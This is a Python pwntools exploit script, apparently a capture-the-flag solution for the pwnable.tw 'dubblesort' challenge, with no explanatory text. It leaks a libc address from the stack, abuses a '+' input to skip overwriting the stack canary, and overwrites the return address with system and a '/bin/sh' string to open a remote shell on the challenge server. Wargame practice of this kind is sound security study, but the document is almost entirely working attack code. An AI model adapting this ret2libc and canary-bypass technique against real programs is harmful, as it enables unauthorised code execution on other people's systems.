#!/usr/bin/python3
from pwn import * 

context.log_level = "debug"
context.arch = "i386"
context.binary = elf = ELF('./dubblesort_patched')

# p = process('./dubblesort_patched')
p = remote('chall.pwnable.tw', 10101)
payload = b'abcd' * 4 
p.send(payload)
p.recvuntil(payload)
leak = u32(p.recvn(4)) - 587823
log.info("Leak: " + hex(leak))
bin_sh = 0x00158e8b
system = 0x0003a940
random_gadget = 0x0008e5e0
gadget = [leak + system, leak + system, leak + bin_sh]
idx = 0
p.sendlineafter(b'sort :', b'35')
for i in range(35):
    if i >= 24:
        if i == 24:
            p.sendlineafter(b'number : ', b'+')
        elif i - 24 < 8: 
            p.sendlineafter(b'number : ', str(gadget[0]))
        elif i >= 32:
            p.sendlineafter(b'number : ', str(gadget[i - 33]))
    else:
        p.sendlineafter(b'number : ', b'0')
p.interactive()
